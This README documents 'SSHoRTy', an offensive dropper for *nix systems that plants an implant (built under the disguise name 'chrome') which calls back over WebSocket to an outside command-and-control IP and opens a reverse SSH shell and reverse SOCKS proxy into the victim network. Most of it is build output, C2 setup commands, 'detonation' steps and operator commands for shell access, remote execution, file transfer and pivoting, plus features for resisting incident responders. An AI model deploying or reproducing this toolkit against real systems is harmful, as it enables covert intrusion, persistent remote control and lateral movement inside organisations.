
# SSHoRTy

A standalone SSH Reverse shell tunnel and Reverse SOCKS Proxy Dropper for *nix systems. 
```bash
 [Organization]  ----- |Internet| ------ [Attacker C2]
 
      (Dropper)  ------ Call back ------> SSH Server -------------------|
                                                                        |  Attacker SSH shell client             
 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|
                                                                        |  Attacker Browser+SOCKS
 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
    Internal Hosts N+1

```
## Features

- Full PTY support, the "real" shell
- end-to-end SSH w/key equivalency
- RSA key can be hosted offsite and fetched for operation. It is Additionally encrypted with AES in flight 
- Reverse SSH is protected on atatcker side with an additional password to avoid hijacking connections.
- Ability to protect from C2 takeover from DFIR by authorized_keys options 

Note: No SCP yet. No DNS proxying yet.

## Deployment 

### Build Dropper and Create Keys

`$ ./tools/build.sh ./conf/build.profile `

```
        Cutting Implant ID 4fa48c653682c3b04add14f434a3114 for target (darwin/amd64)

### PHASE I:  Implant Generation ###
------------------------------------

[*] Building Keys For 4fa48c653682c3b04add14f434a3114 
[+] Generating PK
2019/04/05 00:32:51 Private Key generated
[+] Generating PUB from PK (SSH pub)
2019/04/05 00:32:51 Public key generated
[+] Encoding PK to PEM
[+] Writing PK to file: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pk 
2019/04/05 00:32:51 Key saved to: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pk
[+] Writing PUB to file: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pub 
2019/04/05 00:32:51 Key saved to: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pub
[+] Encrypting PK with passphrase (transmission/storage)
[+] Encoding PK B64 armored PK (transmission)
[+] Saving B64 armored PK to file: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.bpk
2019/04/05 00:32:51 Key saved to: ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.bpk


[*] Building dropper 4fa48c653682c3b04add14f434a3114 (chrome) for darwin / amd64 


**********************************************

Implant: chrome (6942380 bytes) Generated
!!! Here is the info on Implant configuraton !!!
!!! Record the info somewhere safe and we have saved a copy here !!!
!!!     Implant Info: /Users/dimas/Code/go/src/sshpipe/out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.info               !!!
!!! This info is mostly embedded in the Implant.                 !!!
!!! Again, save it, or you will need to regenerate the implant.  !!!
**********************************************
```
The build process saves important information on agent properties and context into the file:

```
-------------- START INFO--------------

(Blue) Implant Egress HTTP Proxy Info
    +HTTP Proxy:(from env?) yes
     HTTP Proxy: http://167.99.88.24:8080
     HTTP Proxy AuthUser companyuser
     HTTP Proxy AuthPass <masked>

(Blue) Implant Execution Context
    Daemonize? no
    PIDFile: /tmp/chrome.pid
    LogFile (!! Debug locally !!): /tmp/chrome.log
    SSHEnvTerm xterm
    SSHShell /bin/sh

(Yellow/Red) Implant HTTP/WS/WSS Wrap Endpoints
    HTTP Endpoint: http://167.99.88.24:8082
    WS Endpoint: wss://167.99.88.24:8082/stream

(Yellow/Red) SSH Rendezvous Point:
    SSHServerHost=127.0.0.1
    SSHServerPort=222
    SSHServerUser=4fa48c653682c3b04add14f434a3114

(Yellow/Red) SSH Key Hosting / Embedding:
    +SSHServerUserKeyFile=./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.bpk
    SSHServerUserKeyUrl=http://127.0.0.1:9000/4fa48c653682c3b04add14f434a3114.bpk
    SSHServerUserKeyPassphrase=7acf0d4ea272b24e095d5d74940a658

(Red) RT Operator Interface to SSH Implant Channel:
    SSHRemoteCmdHost=127.0.0.1
    SSHRemoteCmdPort=2022

(Red) RT Operator SSH Tunnel Usage and Authentication Info
    SSHRemoteCmdUser=operator
    SSHRemoteCmdPwd=f525a463a8a7fb3a5a11715bec926dd

(Red) RT Operator SOCKS Tunnel Usage Info:
    SSHRemoteSocksHost=127.0.0.1
    SSHRemoteSocksPort=1080
-------------- END INFO----------------
```

Build script packages key material for infra deployment:
```
[*] Packaging 4fa48c653682c3b04add14f434a3114 for infrastructure deployment 
~/Code/go/src/sshpipe/out/4fa48c653682c3b04add14f434a3114 ~/Code/go/src/sshpipe
a ./4fa48c653682c3b04add14f434a3114.pk
a ./4fa48c653682c3b04add14f434a3114.bpk
a ./4fa48c653682c3b04add14f434a3114.pub
~/Code/go/src/sshpipe

```
_Based on your build profile you can expect the following Deployment Plan_

## Install 

### Install implant support (manual)
```
### PHASE II: Red Infra Prep Deployment Guidance ###
----------------------------------------------------

A. If you have chosen to fetch armored SSH key from external Yellow/Red hosting, please host  ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.bpk on your HTTP server. The key is encrypted, passworded and B64 protected. You can leave it on clear storage and use plaintext transmission. The implant will take care of the rest.

B.You will need to create user 4fa48c653682c3b04add14f434a3114 on SSH server where you want Implant to terminate the reverse tunnel on Red network. Refer to scripts in infra directory. SSH keys for the would be user are pregenerated:  ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pk and  ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pub. You need to place them in .ssh directory as per usual SSH access setup (mind the permissions on keys and .ssh directory)

C. You will need to stand up an WSS unwrap service on Yellow/Red side. Refer to scripts in infra directory or documentation.

```
### Install implant support (automation)

`./install_implant.sh  /tmp/4fa48c653682c3b04add14f434a3114.tar.gz`

```
[+] Checking if 4fa48c653682c3b04add14f434a3114 OS account is available
[+] Creating 4fa48c653682c3b04add14f434a3114 OS account
sent invalidate(passwd) request, exiting
sent invalidate(group) request, exiting
sent invalidate(passwd) request, exiting
sent invalidate(group) request, exiting
[+] Setting up 4fa48c653682c3b04add14f434a3114 HOME
[+] Unpacking SSH Keys from 4fa48c653682c3b04add14f434a3114.tar.gz
./4fa48c653682c3b04add14f434a3114.pk
./4fa48c653682c3b04add14f434a3114.bpk
./4fa48c653682c3b04add14f434a3114.pub
[+] Setting 4fa48c653682c3b04add14f434a3114 SSH keys
[+] Adding PUBLIC Key /tmp//4fa48c653682c3b04add14f434a3114/.ssh/4fa48c653682c3b04add14f434a3114 to Agent's Authorized keys file
[+] Currently, content of 4fa48c653682c3b04add14f434a3114 's HOME:
drwx------ 3 4fa48c653682c3b04add14f434a3114 users 4096 Apr  5 05:52 /tmp//4fa48c653682c3b04add14f434a3114
drwx------ 2 4fa48c653682c3b04add14f434a3114 root 4096 Apr  5 05:52 /tmp//4fa48c653682c3b04add14f434a3114/.ssh
-rw------- 1 4fa48c653682c3b04add14f434a3114 staff 4364 Apr  5 04:42 /tmp//4fa48c653682c3b04add14f434a3114/.ssh/4fa48c653682c3b04add14f434a3114.bpk
-rw------- 1 4fa48c653682c3b04add14f434a3114 staff 3243 Apr  5 04:42 /tmp//4fa48c653682c3b04add14f434a3114/.ssh/4fa48c653682c3b04add14f434a3114.pk
-rw------- 1 4fa48c653682c3b04add14f434a3114 staff  725 Apr  5 04:42 /tmp//4fa48c653682c3b04add14f434a3114/.ssh/4fa48c653682c3b04add14f434a3114.pub
-rw-r--r-- 1 root                            root   725 Apr  5 05:52 /tmp//4fa48c653682c3b04add14f434a3114/.ssh/authorized_keys
/opt/sshorty/tools
[!!!] If not embedding PK into implant, host armored PK: /tmp//4fa48c653682c3b04add14f434a3114/.ssh/4fa48c653682c3b04add14f434a3114.bpk
```
## Detonation

```
### PHASE III: Blue Detonation and Connect back ###
---------------------------------------------------


    0. Get the Implant on the Blue system detonate.
    1. Implant 4fa48c653682c3b04add14f434a3114 connects to WS Endpoint wss://167.99.88.24:8082/stream
        which unwraps to SSH tunnel 127.0.0.1:222 Red rendezvous

    2. Implant authenticates to SSH rendezvous with RSA PK in ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.pk wrapped for transmission as ./out/4fa48c653682c3b04add14f434a3114/4fa48c653682c3b04add14f434a3114.bpk as SSH/OS user 4fa48c653682c3b04add14f434a3114

    3. Once authenticated the Implant opens up reverse SSH tunnel to Blue network and also stands up two ports on the Red side for convenience:
        - SSH command port 2022
        - SOCKS 1080 port used for proxying Red traffic over the channel to the implant to exit on Blue network



```
## Operation

```
### PHASE IV: RTO Guidance ###
-----------------------------------------------

RTOs can connect to the new implant channel by connecting to Red rendezvous ports exposed by the implant on Red network.

Examples:
    For SSH interactive shell: ssh operator@127.0.0.1 -p 2022
    For SSH batch exec: ssh operator@127.0.0.1 -p 2022 /path/command/on/blue
    For SCP: scp -P 2022 /path/to/file/on/red  operator@127.0.0.1:/path/to/file/on/blue"

Note: To use SOCKS in browser point browser to 127.0.0.1:1080 or for system wide coverage use proxychains with the same configuration
```

## C2:

Unwrap websocket and forward to SSH port
```bash
./websockify.py --ssl-only  --cert=/Users/dimas/Code/go/src/sshpipe/websocketd/sslcert.pem --key=/Users/dimas/Code/go/src/sshpipe/websocketd/sslkey.pem 8080 167.99.88.24:22
``` 

Local SSH tunnel to proxy host in the background 
``` 
ssh  -N -f -q  -L 127.0.0.1:1080:127.0.0.1:1080 root@167.99.88.24
``` 

```bash
/usr/bin/htpasswd -v  /etc/squid/passwords  companyuser
```
## Code used
Thanks to ref: 
- https://golang-basic.blogspot.com/2014/06/step-by-step-guide-to-ssh-using-go.html
- https://sourcegraph.com/github.com/golang/crypto@38d8ce5564a5b71b2e3a00553993f1b9a7ae852f/-/blob/ssh/example_test.go?utm_source=share#L52
- https://gist.github.com/jpillora/b480fde82bff51a06238
- https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
-	 https://gist.github.com/pavel-odintsov/0208f1848952d4940b4a5976165db17f
-	 https://github.com/creack/termios/blob/master/win/win.go
-	 https://github.com/davecheney/socksie
-	 https://sosedoff.com/2015/05/25/ssh-port-forwarding-with-go.html
- https://raw.githubusercontent.com/Scalingo/go-ssh-examples/master/server_complex.go

